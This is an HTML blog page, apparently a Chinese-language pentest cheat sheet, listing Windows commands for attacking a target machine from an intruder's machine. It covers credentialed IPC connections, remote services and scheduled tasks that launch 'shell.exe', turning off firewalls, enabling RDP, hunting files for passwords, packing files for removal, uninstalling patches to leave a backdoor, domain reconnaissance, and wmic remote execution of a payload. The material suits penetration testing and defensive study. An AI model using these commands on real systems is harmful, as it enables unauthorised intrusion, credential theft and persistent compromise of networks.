@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="0x01 基础命令使用:
+演示环境:12win2008R2cn     ip: 192.168.3.23    假设为入侵者机器win2012R2cn     ip: 192.168.3.122   假设为目标机器
+123456# whoami /all			  查当前用户在目标系统中的具体权限,这可能会成为你一上来的习惯性动作 ^_^# query user			  查当前机器中正在线的用户,注意管理员此时在不在# hostname			  查当前机器的机器名,知道当前机器是干啥的# net user 			  查当前机器中所有的用户名,开始搜集准备用户名字典# net localgroup		  查当前机器中所有的组名,了解不同组的职能,如,IT,HR,ADMIN,FILE...# net localgroup &amp;quot;Administrators&amp;quot; 查指定组中的成员列表
+查看本机ip配置:12# ipconfig /all		查看本机ip配置,观察本机是否在域内,内网段有几个,网关在哪里# ipconfig /displaydns	查看本地DNS缓存
+查看当前机器中所有的网络连接:123456# net start				查看本机运行的所有服务# netstat -ano				查看本机所有的tcp,udp端口连接及其对应的pid# netstat -anob				查看本机所有的tcp,udp端口连接,pid及其对应的发起程序# netstat -ano | findstr &amp;quot;ESTABLISHED&amp;quot;	查看当前正处于连接状态的端口及ip# netstat -ano | findstr &amp;quot;LISTENING&amp;quot;	查看当前正处于监听状态的端口及ip# netstat -ano | findstr &amp;quot;TIME_WAIT&amp;quot;">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="基础命令使用 [ win篇 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>基础命令使用 [ win篇 ] - APT404-不疯不魔怎么活</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/11/05/win-cmd/">
+                基础命令使用 [ win篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-11-05</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/win-cmd/">win cmd</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 基础命令使用:</p>
+<p>演示环境:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win2008R2cn     ip: 192.168.3.23    假设为入侵者机器</span><br><span class="line">win2012R2cn     ip: 192.168.3.122   假设为目标机器</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># whoami /all			  查当前用户在目标系统中的具体权限,这可能会成为你一上来的习惯性动作 ^_^</span><br><span class="line"># query user			  查当前机器中正在线的用户,注意管理员此时在不在</span><br><span class="line"># hostname			  查当前机器的机器名,知道当前机器是干啥的</span><br><span class="line"># net user 			  查当前机器中所有的用户名,开始搜集准备用户名字典</span><br><span class="line"># net localgroup		  查当前机器中所有的组名,了解不同组的职能,如,IT,HR,ADMIN,FILE...</span><br><span class="line"># net localgroup &quot;Administrators&quot; 查指定组中的成员列表</span><br></pre></td></tr></table></figure>
+<p>查看本机ip配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ipconfig /all		查看本机ip配置,观察本机是否在域内,内网段有几个,网关在哪里</span><br><span class="line"># ipconfig /displaydns	查看本地DNS缓存</span><br></pre></td></tr></table></figure></p>
+<p>查看当前机器中所有的网络连接:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># net start				查看本机运行的所有服务</span><br><span class="line"># netstat -ano				查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line"># netstat -anob				查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line"># netstat -ano | findstr &quot;ESTABLISHED&quot;	查看当前正处于连接状态的端口及ip</span><br><span class="line"># netstat -ano | findstr &quot;LISTENING&quot;	查看当前正处于监听状态的端口及ip</span><br><span class="line"># netstat -ano | findstr &quot;TIME_WAIT&quot;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>利用最基础的ipc连接,这里需要注意下防火墙,如果没允许<code>文件和打印共享</code>服务,是根本net不上去的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># net use \\192.168.3.122\ipc$ /u:&quot;&quot; &quot;&quot;		先空连接探测</span><br><span class="line"># net use					查看当前机器中的ipc连接有哪些</span><br><span class="line"># net use \\192.168.3.122\ipc$ /del</span><br><span class="line"># net use \\192.168.3.122\admin$ /user:&quot;dcadmin&quot; &quot;admin!@#45&quot; 	建立真正的ipc</span><br></pre></td></tr></table></figure></p>
+<p>ipc建立成功后,尝试直接在本地往远程机器上拷贝文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一种方式:</span><br><span class="line"># net use p: \\192.168.3.122\c$		可在建立ipc后直接把对方的c盘映射过来,直接在本地进行拷贝</span><br><span class="line"># net use p: /del			用完以后,务必立马删除映射</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第二种方式[推荐用xcopy]:</span><br><span class="line"># xcopy d:\sqlitedata\*.* \\192.168.3.122\c$\temp /E /Y /D  也可在建立ipc后直接远程拷贝</span><br></pre></td></tr></table></figure>
+<p>依然是在ipc建立后,可直接在远程机器上创建,删除服务,创建服务时需要注意,常规程序需要有返回值,不然启动服务时会报1053错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># sc \\192.168.3.122 create shellsrv binpath= &quot;c:\shell.exe&quot; start= auto displayname= &quot;shellstart&quot;</span><br><span class="line"># sc \\192.168.3.122 stop shllsrv</span><br><span class="line"># sc \\192.168.3.122 delete shellsrv</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># net use \\192.168.3.122\admin$ /del</span><br><span class="line"># net use * /del	最后,删除所有ipc,如果系统中还有其它的ipc连接,也可指定只删除自己的</span><br></pre></td></tr></table></figure>
+<p>在远程机器上快速创建删除定时任务,需要指定目标系统的账号密码 [ 03以下系统用at,想必大家都已非常熟练,这里不再多说 ]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># net use \\192.168.3.122\admin$ &quot;admin!@#45&quot; /user:&quot;klionsec\administrator&quot;</span><br><span class="line"># net time \\192.168.3.122	查看目标机器当前时间</span><br><span class="line"># net use \\192.168.3.122\admin$ /del</span><br><span class="line"></span><br><span class="line"># schtasks /create  /?		查看schtasks使用帮助</span><br><span class="line"># chcp 437			如果当前机器是中文系统需要先修改下cmd字符集,默认cmd是gbk,不然后面用schtasks远程创建计划任务时会报错</span><br><span class="line"># chcp 936			用完以后再把字符集改回来,如果是英文系统就不会有这种问题</span><br><span class="line"># schtasks /s 192.168.3.122 /u &quot;klionsec\administrator&quot; /p &quot;admin!@#45&quot; /create /TN &quot;shellexec&quot; /SC DAILY /ST 11:18 /F /RL HIGHEST /SD 2017/11/13 /ED 2017/11/16 /TR &quot;C:\shell.exe&quot;</span><br><span class="line"># schtasks /s 192.168.3.122 /u &quot;klionsec\administrator&quot; /p &quot;admin!@#45&quot; /query  | findstr &quot;shell&quot;</span><br><span class="line"># schtasks /s 192.168.3.122 /u &quot;klionsec\administrator&quot; /p &quot;admin!@#45&quot; /TN &quot;shellexec&quot; /delete</span><br></pre></td></tr></table></figure></p>
+<p>初步先大致看下当前所在内网有多少存活机器 [ 单基于icmp的扫描 ]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># for /L %I in (1,1,254) DO @ping -n 1 192.168.3.%I | findstr &quot;TTL=128&quot; &gt;&gt; pinglog.txt</span><br></pre></td></tr></table></figure></p>
+<p>搜集当前内网中的dns信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># for /L %I in (1,1,254) DO @nslookup 192.168.3.%I | find &quot;Name:&quot; &gt;&gt; dnslog.txt</span><br></pre></td></tr></table></figure></p>
+<p>操作当前机器防火墙[务必先提权]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># netsh advfirewall show private		查看当前机器防火墙状态</span><br><span class="line"># netsh advfirewall set allprofiles state off	关闭当前机器防火墙</span><br><span class="line"># netsh advfirewall set allprofiles state on	开启当前机器防火墙</span><br></pre></td></tr></table></figure></p>
+<p>操作当前机器的rdp,实战中推荐直接用powershell来搞,直接用reg可能会触发防护报警:</p>
+<p>第一种,使用原始的reg工具,适合03以下的系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询rdp的端口,注意把默认的十六进制转换成十进制</span><br><span class="line"># reg query &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line"></span><br><span class="line">启用rdp:</span><br><span class="line"># reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">禁用rdp:</span><br><span class="line"># reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></p>
+<p>第二种,利用powershell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用powershell启用禁用rdp:</span><br><span class="line">C:\&gt;powershell -exec bypass</span><br><span class="line">PS C:\&gt; Set-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Terminal Server&apos;-name &quot;fDenyTSConnections&quot; -Value 0</span><br><span class="line">PS C:\&gt; Set-ItemProperty -Path &apos;HKLM:\System\CurrentControlSet\Control\Terminal Server&apos;-name &quot;fDenyTSConnections&quot; -Value 1</span><br><span class="line"></span><br><span class="line">放开防火墙对rdp的限制</span><br><span class="line"># netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes</span><br><span class="line"># netsh advfirewall firewall set rule group=&quot;远程桌面&quot; new enable=yes</span><br></pre></td></tr></table></figure></p>
+<p>查看本机的路由情况:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># route print			打印本机路由信息,可以看到本机所有的网卡接口</span><br><span class="line"># arp -a			查找有价值的内网arp 通信记录</span><br><span class="line"># netsh int ip delete arpcache	删除当前机器的arp缓存</span><br><span class="line"># tracert 8.8.8.8	 	跟踪本机出口ip</span><br></pre></td></tr></table></figure></p>
+<p>查看当前机器自身的配置信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># systeminfo 			查看本机的详细配置信息</span><br><span class="line"># systeminfo /S 192.168.3.122 /U KLIONSEC\administrator /P &quot;admin!@#123&quot;	查看远程指定机器的详细系统配置信息</span><br><span class="line"># systeminfo&gt;temp.txt&amp;(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt</span><br><span class="line"></span><br><span class="line"># set				查看当前机器的环境变量配置,看有没有我们可以直接利用到的语言环境</span><br><span class="line"># ver / winver  		查看当前机器的NT内核版本</span><br><span class="line"># fsutil fsinfo drives 		列出当前机器上的所有盘符</span><br><span class="line"># net share			查看当前机器开启的共享</span><br><span class="line"># net share public_dir=&quot;c:\public&quot; /grant:Everyone,Full	 设置共享</span><br></pre></td></tr></table></figure></p>
+<p>在指定目录下搜集各类敏感文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># dir /a /s /b d:\&quot;*.txt&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*.xml&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*.mdb&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*.sql&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*.mdf&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*.eml&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*.pst&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*conf*&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*bak*&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*pwd*&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*pass*&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*login*&quot;</span><br><span class="line"># dir /a /s /b d:\&quot;*user*&quot;</span><br></pre></td></tr></table></figure></p>
+<p>批量压缩指定文件,注意,list.txt里存放的是所有要打包文件的绝对路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># makecab /f list.txt /d compressiontype=lzx /d compressionmemory=21 /d maxdisksize=1024000000 /d diskdirectorytemplate=dd* /d cabinetnametemplate=dd*.cab</span><br></pre></td></tr></table></figure></p>
+<p>在指定目录下搜集各种账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak </span><br><span class="line"># findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak </span><br><span class="line"># findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak </span><br><span class="line"># findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak </span><br><span class="line"># findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure></p>
+<p>查看,删除 指定文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># type ad\admin_pass.bak		查看某个文件内容</span><br><span class="line"># del d:\ad\*.* /a /s /q /f 		强制删除指定路径下的所有文件</span><br><span class="line"># tree /F /A D:\ &gt;&gt; file_list.txt	导出指定路径下的文件目录结构</span><br></pre></td></tr></table></figure></p>
+<p>查看当前机器的进程信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># tasklist /svc		显示当前机器所有的进程所对应的服务[只限于当前用户又权限看到的进程]</span><br><span class="line"># tasklist /m		显示本地所有进程所调用的dll[同样只限于当前用户又权限看到的进程]</span><br><span class="line"># tasklist /S 192.168.3.122 /v /U administrator /P &quot;admin!@#123&quot;		 查看远程指定机器的进程列表</span><br><span class="line"># tasklist /S 192.168.3.122 /v /U KLIONSEC\administrator /P &quot;admin!@#123&quot;	 域内可以直接用机器名来代替</span><br><span class="line"></span><br><span class="line"># taskkill /im calc.exe	用指定进程名的方式结束指定进程</span><br><span class="line"># taskkill /S 192.168.3.122 /pid 3440 /U KLIONSEC\administrator /P &quot;admin!@#123&quot; 结束远程机器上的指定进程</span><br><span class="line"></span><br><span class="line"># wusa /uninstall /KB:2999226 /quiet /norestart 	不重启卸载指定系统补丁,方便留后门,前提是权限要够</span><br><span class="line"># driverquery		查看当前机器安装的驱动列表</span><br><span class="line"># restart /r /t 0	立即重启当前机器</span><br></pre></td></tr></table></figure></p>
+<p>0x03 域内net及dsquery套件使用</p>
+<p>利用常规net套件搜集域内信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># net user /domain 		查看当前域中的所有用户名,根据用户名总数大概判断域的规模</span><br><span class="line"># net user epoadmin /domain 	查看指定用户在当前域中的详细属性信息</span><br><span class="line"># net view 			正常情况下可以用该命令查看当前域中在线的机器有哪些,但这样看着确实不太直观,稍微用批处理搞一下把机器名对应的ip也显示出来,岂不更畅快</span><br><span class="line"># net accounts /domain 		查看当前域的域内账户密码设置策略</span><br><span class="line"># net config workstation    	看看当前的登录域</span><br><span class="line"># net view /domain       	查看所有的域名称</span><br><span class="line"># net view /domain:PROGRAM 	查看指定域中在线的计算机列表</span><br><span class="line"># net time /domain		查看主域位置,一般都会把主域作为时间服务器</span><br><span class="line"># net group /domain		查看当前域中的所有组名</span><br><span class="line"># net group &quot;domain admins&quot; /domain 	 看看当前域中的域管都有谁</span><br><span class="line"># net group &quot;domain computers&quot; /domain 	 看看当前域中的所有的计算机名,只要登录过该域计算机名都会被保存下来,并非当前在线机器</span><br><span class="line"># net group &quot;domain controllers&quot; /domain 看看域控是哪几个</span><br><span class="line"># nltest /domain_trusts 		 查看域内信任关系</span><br></pre></td></tr></table></figure></p>
+<p>批量把net view的结果转换为ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal ENABLEDELAYEDEXPANSION</span><br><span class="line">@FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (</span><br><span class="line">@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (</span><br><span class="line">@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k  %%j)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>利用dsquery 工具搜集域内信息,该工具貌似只在域控机器上有,应该是在域的安装包里,你可以把对应系统的这个工具的exe和dll扣出来上传上去用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># dsquery computer 	查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个和目标系统版本对应的dsquery</span><br><span class="line"># dsquery user 		查看当前域中的所有账户名</span><br><span class="line"># dsquery group 	查看当前域内的所有组名</span><br><span class="line"># dsquery subnet 	查看到当前域所在的网段</span><br><span class="line"># dsquery site 		查看域内所有的web站点</span><br><span class="line"># dsquery server	查看当前域中的所有服务器(应该是指域控)</span><br><span class="line"># dsquery user domainroot -name admin* -limit 240  查询前240个以admin开头的用户名</span><br></pre></td></tr></table></figure></p>
+<p>0x04 wmic套件使用[其实,上面基础工具能干的事情,wmic全部能干,且过之不及],在操作远程时,如果遇到’RPC 服务不可用’直接把机器名换成ip即可,别看这么多,我们实战用的最多的可能就是远程执行及远程开启rdp了,如,远程导hash,远程执行payload…</p>
+<p>查询当前及远程机器的进程信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># wmic process list brief</span><br><span class="line"># wmic process list brief /every:1	每隔一秒刷新一次系统进程</span><br><span class="line"># wmic /node:&quot;192.168.3.122&quot; /user:klionsec\administrator /password:&quot;admin!@#123&quot; process list brief</span><br></pre></td></tr></table></figure></p>
+<p>查询当前及远程机器上指定进程的详细信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic process where name=&apos;calc.exe&apos;  list brief</span><br><span class="line"># wmic /node:&quot;192.168.3.122&quot; /user:klionsec\administrator /password:&quot;admin!@#123&quot; process where name=&apos;calc.exe&apos;  list brief</span><br></pre></td></tr></table></figure></p>
+<p>删除当前及远程机器中的指定进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic process where name=&apos;calc.exe&apos; delete</span><br><span class="line"># wmic /node:&quot;192.168.3.122&quot; /user:klionsec\administrator /password:&quot;admin!@#123&quot; process where name=&apos;calc.exe&apos; delete</span><br></pre></td></tr></table></figure></p>
+<p>在当前机器中执行指定程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic process call create &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure></p>
+<p>通过smb在远程机器上执行指定程序,如,在本地让远程机器上线,在抓取目标系统用户的hash,等等…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic /node:192.168.3.122 /user:klionsec\administrator /password:&quot;admin!@#123&quot; process call create &quot;web_delivery payload&quot;</span><br></pre></td></tr></table></figure></p>
+<p>终止执行某程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic process where name=&quot;calc.exe&quot; call terminate</span><br><span class="line"># wmic /node:192.168.3.122 /user:klionsec\administrator /password:&quot;admin!@#123&quot; process where name=&quot;calc.exe&quot; call terminate</span><br></pre></td></tr></table></figure></p>
+<p>开启,关闭当前机器的rdp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1	开启</span><br><span class="line"># wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 0	关闭</span><br></pre></td></tr></table></figure></p>
+<p>开启,关闭远程机器的rdp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic /node:&quot;192.168.3.122&quot; /USER:&quot;klionsec\administrator&quot; /password:&quot;admin!@#123&quot; PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1 </span><br><span class="line"># wmic /node:&quot;192.168.3.122&quot; /USER:&quot;klionsec\administrator&quot; /password:&quot;admin!@#123&quot; PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 0</span><br></pre></td></tr></table></figure></p>
+<p>查询当前机器已安装的补丁<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic qfe get description,installedOn,HotFixID,InstalledBy</span><br><span class="line"># wmic qfe get CSName,Description,hotfixid</span><br></pre></td></tr></table></figure></p>
+<p>查询当前机器自启动程序有哪些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic startup list full</span><br><span class="line"># wmic STARTUP GET Caption,Command,User</span><br></pre></td></tr></table></figure></p>
+<p>查询当前机器所安装的所有软件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic product get name /value</span><br><span class="line"># wmic product get name,version</span><br></pre></td></tr></table></figure></p>
+<p>删除当前机器中指定名称的软件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic product where name=&quot;Google Update Helper&quot; call uninstall /nointeractive</span><br></pre></td></tr></table></figure></p>
+<p>查询本机所有的盘符及剩余空间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wmic logicaldisk get description,name</span><br><span class="line"># wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber</span><br></pre></td></tr></table></figure></p>
+<p>查询当前机器的简要配置信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wmic computersystem list brief /format:list</span><br></pre></td></tr></table></figure></p>
